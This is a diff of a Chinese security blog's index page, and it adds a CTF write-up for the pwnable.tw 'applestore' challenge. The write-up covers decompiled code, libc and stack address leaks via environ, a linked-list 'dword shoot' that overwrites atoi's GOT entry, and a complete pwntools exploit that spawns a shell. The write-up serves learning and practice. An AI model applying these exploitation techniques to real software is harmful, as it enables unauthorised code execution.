@@ -297,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/22/ck5pcil1y000o4mu5xxwoa3wf/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/24/ck5rvhrjw000n7du59o3wryk0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -316,7 +316,182 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/22/ck5pcil1y000o4mu5xxwoa3wf/" itemprop="url">CSAPP Datalab</a></h1>
+                <a class="post-title-link" href="/year/01/24/ck5rvhrjw000n7du59o3wryk0/" itemprop="url">pwnable-tw applestore</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T11:08:01+08:00">
+                2020-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn题writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn题writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这道题我一开始一直以为是堆，然后也一直没找到堆溢出的漏洞，最后看了题解才知道原来是个栈，利用方式以前其实也做过，还是不能思维定式了。</p>
+<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p><img src="/year/01/24/ck5rvhrjw000n7du59o3wryk0/1.png" alt></p>
+<p>可以看出主要有四个功能，大致实现就是用双向链表。结构是<code>name|money|fd|bk</code>这样子。</p>
+<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>在checkout函数里,到了7147可以获得一部iphone8，然而这个iphone8却是用栈加进去的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">checkout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+10h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+18h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = cart();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">7174</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"*: iPhone 8 - $1"</span>);</span><br><span class="line">    asprintf(&amp;v2, <span class="string">"%s"</span>, <span class="string">"iPhone 8"</span>);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    insert((<span class="keyword">int</span>)&amp;v2);</span><br><span class="line">    v1 = <span class="number">7175</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Total: $%d\n"</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Want to checkout? Maybe next time!"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然这里没有栈溢出，但是可以利用其它函数比如delete，或者cart来修改栈上的内容。</p>
+<h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><ul>
+<li><p>由上可以泄露出libc地址，也可以泄露出堆地址。</p>
+</li>
+<li><p>还通过libc中的environ来泄露栈地址。</p>
+</li>
+</ul>
+<p>如何泄露栈地址？</p>
+<ol>
+<li><p>在libc中保存了一个函数叫_environ，存的是当前进程的环境变量</p>
+</li>
+<li><p>得到libc地址后，libc基址+_environ的偏移量=_environ的地址<br>在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量之和libc库有关</p>
+</li>
+<li><p>通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p>
+</li>
+</ol>
+<h3 id="修改双向链的fd-bk"><a href="#修改双向链的fd-bk" class="headerlink" title="修改双向链的fd bk"></a>修改双向链的fd bk</h3><ul>
+<li>修改双向链表的fd bk可以在delete的过程中造成一个dwordshoot的攻击，也就相当于任意地址写四字节，然而想直接修改atoi的got表为system会出现段错误（没权限）</li>
+<li>利用dwordshoot修改delete函数的ebp，改变handler函数中参数的位置(修改为atoi_got - 0x22)，这样my_read会直接读到atoi的got中，并且atoi_got可以往里面写。</li>
+<li>最后仍然是利用linux的参数截断特点，输入system+‘；/bin/sh’ 获得shell</li>
+</ul>
+<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">d = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">"./applestore"</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">		gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10104</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Device Number&gt; "</span>, str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Item Number&gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cart</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, str(<span class="number">5</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Let me check your cart. ok? (y/n) &gt; "</span>, ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">checkout(<span class="string">'y'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./applestore"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">got_atoi = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'ya'</span> + p32(got_atoi) + p32(<span class="number">0xdeadbeaf</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">libc_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = libc_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">environ_libc = libc_base + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"environ_libc -&gt; "</span> + hex(environ_libc)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_addr -&gt; "</span> + hex(libc_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base -&gt; "</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system -&gt; "</span> + hex(system)</span><br><span class="line">payload = <span class="string">'ya'</span> + p32(environ_libc) + <span class="string">'a'</span>*(<span class="number">0xa</span> - <span class="number">2</span> - <span class="number">4</span>) + p32(<span class="number">0</span>)</span><br><span class="line">cart(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"27: "</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack -&gt; "</span> + hex(stack)</span><br><span class="line">payload = <span class="string">'27'</span> + p32(stack) + p32(<span class="number">0x12345678</span>)</span><br><span class="line">payload += p32(got_atoi + <span class="number">0x22</span>) + p32(stack - <span class="number">0x10c</span>)</span><br><span class="line">ebp_addr = stack - <span class="number">0x10c</span></span><br><span class="line">log.success(<span class="string">'ebp: '</span> + hex(ebp_addr))</span><br><span class="line">delete(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>, p32(system) + <span class="string">"||/bin/sh"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+      <div>
+        
+      </div>
+
+    
+
+    
+
+    
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/22/ck5rvhrjk000b7du5xoiuim7y/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wood">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木头的小木屋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/year/01/22/ck5rvhrjk000b7du5xoiuim7y/" itemprop="url">CSAPP Datalab</a></h1>
         
 
         <div class="post-meta">
@@ -392,7 +567,7 @@
           <p>CSAPP大概都过了一遍，但是很多东西不实践一下理解还是不到位，趁这个假期尽量把11个lab做一下。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/22/ck5pcil1y000o4mu5xxwoa3wf/#more" rel="contents">
+            <a class="btn" href="/year/01/22/ck5rvhrjk000b7du5xoiuim7y/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -448,7 +623,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/21/ck5pcil2r00224mu5s60tqsqk/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/21/ck5rvhrke001b7du50yp72kf1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -467,7 +642,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/21/ck5pcil2r00224mu5s60tqsqk/" itemprop="url">pwnable tw silver-bullet</a></h1>
+                <a class="post-title-link" href="/year/01/21/ck5rvhrke001b7du50yp72kf1/" itemprop="url">pwnable tw silver-bullet</a></h1>
         
 
         <div class="post-meta">
@@ -521,7 +696,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一道32位rop题，里面有个<code>off-by-one</code>的细节，这次没有注意，下次一定好好看</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/21/ck5pcil2r00224mu5s60tqsqk/#more" rel="contents">
+            <a class="btn" href="/year/01/21/ck5rvhrke001b7du50yp72kf1/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -577,7 +752,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/20/ck5pcil2p001x4mu58j4puqt1/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/20/ck5rvhrk800127du53puygk6o/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -596,7 +771,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/20/ck5pcil2p001x4mu58j4puqt1/" itemprop="url">pwnable-tw-Hacknote</a></h1>
+                <a class="post-title-link" href="/year/01/20/ck5rvhrk800127du53puygk6o/" itemprop="url">pwnable-tw-Hacknote</a></h1>
         
 
         <div class="post-meta">
@@ -672,7 +847,7 @@
           <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>一道<code>uaf</code>和<code>double free</code>题目，跟以前做的套路不太一样。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/20/ck5pcil2p001x4mu58j4puqt1/#more" rel="contents">
+            <a class="btn" href="/year/01/20/ck5rvhrk800127du53puygk6o/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -728,7 +903,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/19/ck5pcil2n001r4mu5kzzd13qp/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/19/ck5rvhrk6000z7du5hqbk9omw/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -747,7 +922,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/19/ck5pcil2n001r4mu5kzzd13qp/" itemprop="url">pwnable.tw dubble sort题解</a></h1>
+                <a class="post-title-link" href="/year/01/19/ck5rvhrk6000z7du5hqbk9omw/" itemprop="url">pwnable.tw dubble sort题解</a></h1>
         
 
         <div class="post-meta">
@@ -823,7 +998,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>一道基础的栈溢出，开启了pie和canary</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/19/ck5pcil2n001r4mu5kzzd13qp/#more" rel="contents">
+            <a class="btn" href="/year/01/19/ck5rvhrk6000z7du5hqbk9omw/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -879,7 +1054,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/18/ck5pcil1r000g4mu52q6dlq6r/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/18/ck5rvhrjm000d7du5lty66yjk/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -898,7 +1073,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/18/ck5pcil1r000g4mu52q6dlq6r/" itemprop="url">gdb的调试与使用</a></h1>
+                <a class="post-title-link" href="/year/01/18/ck5rvhrjm000d7du5lty66yjk/" itemprop="url">gdb的调试与使用</a></h1>
         
 
         <div class="post-meta">
@@ -975,7 +1150,7 @@
 <p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">gdb-peda</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/18/ck5pcil1r000g4mu52q6dlq6r/#more" rel="contents">
+            <a class="btn" href="/year/01/18/ck5rvhrjm000d7du5lty66yjk/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1031,7 +1206,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/02/ck5pcil1n000c4mu5exk5i4oj/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/02/ck5rvhrjt000h7du5hummqcpf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1050,7 +1225,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/02/ck5pcil1n000c4mu5exk5i4oj/" itemprop="url">pwnable-tw-3x17</a></h1>
+                <a class="post-title-link" href="/year/01/02/ck5rvhrjt000h7du5hummqcpf/" itemprop="url">pwnable-tw-3x17</a></h1>
         
 
         <div class="post-meta">
@@ -1104,7 +1279,7 @@
           <p>停课复习了，闲暇时可以刷刷pwn，writeup参考<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">和媳妇一起学Pwn 之 3x17</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/02/ck5pcil1n000c4mu5exk5i4oj/#more" rel="contents">
+            <a class="btn" href="/year/01/02/ck5rvhrjt000h7du5hummqcpf/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1160,7 +1335,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/13/ck5pcil2h00184mu5yoiz6esm/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/13/ck5rvhrks00237du5r6qs1rbm/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1179,7 +1354,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/11/13/ck5pcil2h00184mu5yoiz6esm/" itemprop="url">湖湘杯复赛题目-writeup</a></h1>
+                <a class="post-title-link" href="/year/11/13/ck5rvhrks00237du5r6qs1rbm/" itemprop="url">湖湘杯复赛题目-writeup</a></h1>
         
 
         <div class="post-meta">
@@ -1256,7 +1431,7 @@
 <h2 id="0x01-HackNodte"><a href="#0x01-HackNodte" class="headerlink" title="0x01 HackNodte"></a>0x01 HackNodte</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这道题是静态链接，修改时用的是<code>strlen</code>,造成了<code>off-by-one</code>，所以堆重叠。然后把<code>chunk</code>分配到<code>main_arena</code>上，再修改<code>unsortedbin</code>,分配到<code>malloc_hook</code>上</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/11/13/ck5pcil2h00184mu5yoiz6esm/#more" rel="contents">
+            <a class="btn" href="/year/11/13/ck5rvhrks00237du5r6qs1rbm/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1312,7 +1487,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/03/ck5pcil2j001e4mu517vdkbzk/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/03/ck5rvhrkp001x7du5j99id6bs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1331,7 +1506,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/11/03/ck5pcil2j001e4mu517vdkbzk/" itemprop="url">格式化字符串漏洞</a></h1>
+                <a class="post-title-link" href="/year/11/03/ck5rvhrkp001x7du5j99id6bs/" itemprop="url">格式化字符串漏洞</a></h1>
         
 
         <div class="post-meta">
@@ -1407,7 +1582,7 @@
           <h2 id="0x00-Emm。。。"><a href="#0x00-Emm。。。" class="headerlink" title="0x00 Emm。。。"></a>0x00 Emm。。。</h2><p>今天做了个河北师范大学招新赛的题，发现好多格式化字符串的题目，以前确实做的很少，正好现在重新总结下。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/11/03/ck5pcil2j001e4mu517vdkbzk/#more" rel="contents">
+            <a class="btn" href="/year/11/03/ck5rvhrkp001x7du5j99id6bs/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1463,7 +1638,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/01/ck5pcil1d00024mu5d84y8d8o/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/11/01/ck5rvhrdi00007du5qbj6ru3v/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1482,7 +1657,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/11/01/ck5pcil1d00024mu5d84y8d8o/" itemprop="url">Return-to-dl-resolve总结</a></h1>
+                <a class="post-title-link" href="/year/11/01/ck5rvhrdi00007du5qbj6ru3v/" itemprop="url">Return-to-dl-resolve总结</a></h1>
         
 
         <div class="post-meta">
@@ -1558,158 +1733,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这个利用方式跟重定位和动态链接有关，现在复习跟总结下</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/11/01/ck5pcil1d00024mu5d84y8d8o/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-      <div>
-        
-      </div>
-
-    
-
-    
-
-    
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/10/23/ck5pcil1h00054mu5cpgse7vx/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Wood">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="木头的小木屋">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/year/10/23/ck5pcil1h00054mu5cpgse7vx/" itemprop="url">SROP利用分析</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T19:52:30+08:00">
-                2019-10-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞分析</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>传统的ROP技术，尤其是amd64上的ROP，需要寻找大量的gadgets以对寄存器进行赋值，执行特定操作，如果没有合适的gadgets就需要进行各种奇怪的组装。这一过程阻碍了ROP技术的使用。而SROP技术的提出大大简化了ROP攻击的流程。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/year/10/23/ck5pcil1h00054mu5cpgse7vx/#more" rel="contents">
+            <a class="btn" href="/year/11/01/ck5rvhrdi00007du5qbj6ru3v/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1756,7 +1780,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1806,7 +1830,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">31</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1828,7 +1852,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
